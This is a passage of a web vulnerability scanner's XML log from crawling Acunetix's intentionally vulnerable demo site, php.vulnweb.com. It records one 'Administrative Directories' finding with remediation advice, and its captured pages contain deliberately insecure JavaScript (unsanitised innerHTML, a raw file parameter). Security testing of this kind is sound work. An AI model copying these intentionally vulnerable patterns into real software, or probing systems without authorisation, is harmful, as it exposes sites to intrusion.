<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class='story'><a href='artists.php?artist=1'><h3>r4w8173</h3></a><p><a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a></p></div><div class='story'><a href='artists.php?artist=2'><h3>Blad3</h3></a><p><a href='#' onClick="window.open('./comment.php?aid=2','comment','width=500,height=400')">comment on this artist</a></p></div><div class='story'><a href='artists.php?artist=3'><h3>lyzae</h3></a><p><a href='#' onClick="window.open('./comment.php?aid=3','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="1C2302E11CB8EF7DA17F6BF587C55102"><Method>GET</Method><Path>/</Path><File>artists</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="1C2302E11CB8EF7DA17F6BF587C55102";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="63";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="e5f8ad72";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b8d55f39";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class='story'><a href='artists.php?artist=1'><h3>r4w8173</h3></a><p><a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a></p></div><div class='story'><a href='artists.php?artist=2'><h3>Blad3</h3></a><p><a href='#' onClick="window.open('./comment.php?aid=2','comment','width=500,height=400')">comment on this artist</a></p></div><div class='story'><a href='artists.php?artist=3'><h3>lyzae</h3></a><p><a href='#' onClick="window.open('./comment.php?aid=3','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:28 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5328</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="D6E304C342FB8CA68120AE0C7B7A270A"><URL>http://php.vulnweb.com:80/admin/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="5d17b48c-89e6-4fef-aed7-e4148eedcde3"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10</EngineType><AttackHTTPRequest><![CDATA[GET /admin/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="D6E304C342FB8CA68120AE0C7B7A270A";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10210";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="a5bcb1dc";
X-Request-Memo: ID="c54d83af";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10210</VulnerabilityID><Severity>1</Severity><Name>Administrative Directories</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Administrative directories were discovered within your web application during a Directory Enumeration scan. Risks associated with an attacker discovering an administrative directory on your application server typically include the potential for the attacker to use the administrative applications to affect the operations of the web site.  Recommendations include restricting access to important directories or files by adopting a "need to know" requirement for both the document and server root, and turning off features such as Automatic Directory Listings that provide information that could be utilized by an attacker when formulating or conducting an attack. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
The primary danger from an attacker finding a publicly available directory on your web application server depends on what type of directory it is, and what files it contains.  Administrative directories typically contain applications capable of changing the configuration of the running software; an attacker who gains access to an administrative application can drastically affect the operation of the web site.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
You should evaluate the production requirements for the found directory.  If the directory is not required for production operation, then the directory and its contents should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.  Automatic directory indexing should also be disabled, if applicable.

<br /><br /><b>For Development:</b><br />
This problem will be resolved by the web application  server administrator.  In general, do not rely on 'hidden' directories within the web root that can contain sensitive resources or web applications.  Assume an attacker knows about the existence of all directories and files on your web site, and protect them with proper access controls.

<br /><br /><b>For QA:</b><br />
This problem will be resolved by the web application server administrator.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Implementing Basic Authentication in IIS</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/abbca505-6f63-4267-aac1-1ea89d861eb4.mspx">http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/a

bbca505-6f63-4267-aac1-1ea89d861eb4.mspx</a><br /><br /><b>Implementing Basic Authentication in Apache</b><br /><a href="http://httpd.apache.org/docs/howto/auth.html#intro">http://httpd.apache.org/docs/howto/auth.html#intro</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="D6E304C342FB8CA68120AE0C7B7A270A"><![CDATA[GET /admin/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="D6E304C342FB8CA68120AE0C7B7A270A";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10210";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="a5bcb1dc";
X-Request-Memo: ID="c54d83af";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:55 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 262

<html>
<head><title>Index of /admin/</title></head>
<body>
<h1>Index of /admin/</h1><hr><pre><a href="../">../</a>
<a href="create.sql">create.sql</a>                                         11-May-2011 10:27                 523
</pre><hr></body>
</html>
]]></RawResponse><Request id="D6E304C342FB8CA68120AE0C7B7A270A"><Method>GET</Method><Path>/admin/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="D6E304C342FB8CA68120AE0C7B7A270A";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10210";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="a5bcb1dc";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c54d83af";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /admin/</title></head>
<body>
<h1>Index of /admin/</h1><hr><pre><a href="../">../</a>
<a href="create.sql">create.sql</a>                                         11-May-2011 10:27                 523
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:55 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>262</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="3026F6CC91D501DA041B989F5755DF90"><URL>http://php.vulnweb.com:80/AJAX/index.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="3026F6CC91D501DA041B989F5755DF90"><![CDATA[GET /AJAX/index.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="3026F6CC91D501DA041B989F5755DF90";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="64";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="d9108ac5";
X-Request-Memo: ID="fbc5c09f";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:29 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4236

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>ajax test</title>
<link href="styles.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
	var httpreq = null;	

	function SetContent(XML) {
		var items = XML.getElementsByTagName('items').item(0).getElementsByTagName('item');
		var inner = '<ul>';
		for(i=0; i<items.length; i++){
			inner = inner + '<li><a href="javascript:getInfo(\'' + items[i].attributes.item(0).value + '\', \'' + items[i].attributes.item(1).value + '\')">' + items[i].firstChild.nodeValue + '</a></li>';
		}
		
		inner = inner + '</ul>'
		
		cd = document.getElementById('contentDiv');
		cd.innerHTML = inner;
		
		id = document.getElementById('infoDiv');
		id.innerHTML = '';
	}

	function httpCompleted() {
		if (httpreq.readyState==4 && httpreq.status==200) {						
			SetContent(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function SetInfo(XML) {
		var ii = XML.getElementsByTagName('iteminfo').item(0);
		var inner = '';
		
		inner = inner + '<p><strong>' + ii.getElementsByTagName('name').item(0).firstChild.nodeValue + '</strong></p>';
		
		pict  = ii.getElementsByTagName('picture');
		if(pict.length>0){
			inner = inner + '<img src="../showimage.php?file=' + pict.item(0).firstChild.nodeValue + '"/>';
		}
		
		descs = ii.getElementsByTagName('description');
		for (i=0; i<descs.length; i++){
			inner = inner + '<p>' + descs.item(i).firstChild.nodeValue + '</p>';
		}
		
		id = document.getElementById('infoDiv');
		id.innerHTML = inner;
	}
	
	function httpInfoCompleted() {		
		if (httpreq.readyState==4 && httpreq.status==200) {
			SetInfo(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function loadSomething(what) {			
		getHttpRequest();		
		httpreq.open('GET', what, true);		
		httpreq.send('');
	}
	
	function getInfo(where, which) {
		getHttpRequest();		
		httpreq.onreadystatechange = httpInfoCompleted;
		if (where=='infotitle'){
			httpreq.open('POST', where+'.php', true);
			httpreq.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
			httpreq.send('id='+which);
		}
		else {
			httpreq.open('GET', where+'.php?id='+which, true);
			httpreq.send('');
		}
	}
	
	function xmlCompleted () {
		if (httpreq.readyState==4 && httpreq.status==200) {
			xd = document.getElementById('xmlDiv');
			xd.innerHTML = httpreq.responseText;
			httpreq = null;
		}	
	}
	
	function sendXML () {
		getHttpRequest();
		httpreq.onreadystatechange = xmlCompleted;
		httpreq.open('POST', 'showxml.php');
		httpreq.setRequestHeader('content-type', 'text/xml');
		httpreq.send('<xml><node name="nodename1">nodetext1</node><node name="nodename2">nodetext2</node></xml>');
	}
	
	function getHttpRequest() {
		// free the curent one
		if (httpreq!=null){
			httpreq.abort();
			httpreq = null;
		}		

    if( window.XMLHttpRequest ) {
			httpreq = new XMLHttpRequest();
			if (httpreq.overrideMimeType) {
					httpreq.overrideMimeType('text/xml');
			}
    } else if(ActiveXObject) {
     	httpreq = new ActiveXObject("Msxml2.XMLHTTP");
		}
			httpreq.onreadystatechange = httpCompleted;
	}
	
	function SetMyCookie() {
		document.cookie = "mycookie=3";
		alert('A cookie was set by JavaScript.');
	}
</script>
</head>
<body>
<table border="0" cellpadding="3" width="500" align="center">
  <tr>
    <td class="bordered">
			<a href="javascript:loadSomething('artists.php');">artists</a> |
			<a href="javascript:loadSomething('categories.php');">categories</a> | 
			<a href="#" onclick="loadSomething('titles.php')">titles</a> |
			<a href="#" onclick="sendXML()">send xml</a> |
			<a href="#" onclick="SetMyCookie()">setcookie</a>
		</td>
  </tr>
  <tr>
    <td>
			<div id="contentDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	<tr>
    <td>
			<div id="infoDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	
	<tr>
    <td>
			<div id="xmlDiv">
				&nbsp;
			</div>
		</td>
  </tr>
</table>
</body>
</html>
]]></RawResponse><Request id="3026F6CC91D501DA041B989F5755DF90"><Method>GET</Method><Path>/AJAX/</Path><File>index</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="3026F6CC91D501DA041B989F5755DF90";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="64";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="d9108ac5";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="fbc5c09f";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>ajax test</title>
<link href="styles.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
	var httpreq = null;	

	function SetContent(XML) {
		var items = XML.getElementsByTagName('items').item(0).getElementsByTagName('item');
		var inner = '<ul>';
		for(i=0; i<items.length; i++){
			inner = inner + '<li><a href="javascript:getInfo(\'' + items[i].attributes.item(0).value + '\', \'' + items[i].attributes.item(1).value + '\')">' + items[i].firstChild.nodeValue + '</a></li>';
		}
		
		inner = inner + '</ul>'
		
		cd = document.getElementById('contentDiv');
		cd.innerHTML = inner;
		
		id = document.getElementById('infoDiv');
		id.innerHTML = '';
	}

	function httpCompleted() {
		if (httpreq.readyState==4 && httpreq.status==200) {						
			SetContent(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function SetInfo(XML) {
		var ii = XML.getElementsByTagName('iteminfo').item(0);
		var inner = '';
		
		inner = inner + '<p><strong>' + ii.getElementsByTagName('name').item(0).firstChild.nodeValue + '</strong></p>';
		
		pict  = ii.getElementsByTagName('picture');
		if(pict.length>0){
			inner = inner + '<img src="../showimage.php?file=' + pict.item(0).firstChild.nodeValue + '"/>';
		}
		
		descs = ii.getElementsByTagName('description');
		for (i=0; i<descs.length; i++){
			inner = inner + '<p>' + descs.item(i).firstChild.nodeValue + '</p>';
		}
		
		id = document.getElementById('infoDiv');
		id.innerHTML = inner;
	}
	
	function httpInfoCompleted() {		
		if (httpreq.readyState==4 && httpreq.status==200) {
			SetInfo(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function loadSomething(what) {			
		getHttpRequest();		
		httpreq.open('GET', what, true);		
		httpreq.send('');
	}
	
	function getInfo(where, which) {
		getHttpRequest();		
		httpreq.onreadystatechange = httpInfoCompleted;
		if (where=='infotitle'){
			httpreq.open('POST', where+'.php', true);
			httpreq.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
			httpreq.send('id='+which);
		}
		else {
			httpreq.open('GET', where+'.php?id='+which, true);
			httpreq.send('');
		}
	}
	
	function xmlCompleted () {
		if (httpreq.readyState==4 && httpreq.status==200) {
			xd = document.getElementById('xmlDiv');
			xd.innerHTML = httpreq.responseText;
			httpreq = null;
		}	
	}
	
	function sendXML () {
		getHttpRequest();
		httpreq.onreadystatechange = xmlCompleted;
		httpreq.open('POST', 'showxml.php');
		httpreq.setRequestHeader('content-type', 'text/xml');
		httpreq.send('<xml><node name="nodename1">nodetext1</node><node name="nodename2">nodetext2</node></xml>');
	}
	
	function getHttpRequest() {
		// free the curent one
		if (httpreq!=null){
			httpreq.abort();
			httpreq = null;
		}		

    if( window.XMLHttpRequest ) {
			httpreq = new XMLHttpRequest();
			if (httpreq.overrideMimeType) {
					httpreq.overrideMimeType('text/xml');
			}
    } else if(ActiveXObject) {
     	httpreq = new ActiveXObject("Msxml2.XMLHTTP");
		}
			httpreq.onreadystatechange = httpCompleted;
	}
	
	function SetMyCookie() {
		document.cookie = "mycookie=3";
		alert('A cookie was set by JavaScript.');
	}
</script>
</head>
<body>
<table border="0" cellpadding="3" width="500" align="center">
  <tr>
    <td class="bordered">
			<a href="javascript:loadSomething('artists.php');">artists</a> |
			<a href="javascript:loadSomething('categories.php');">categories</a> | 
			<a href="#" onclick="loadSomething('titles.php')">titles</a> |
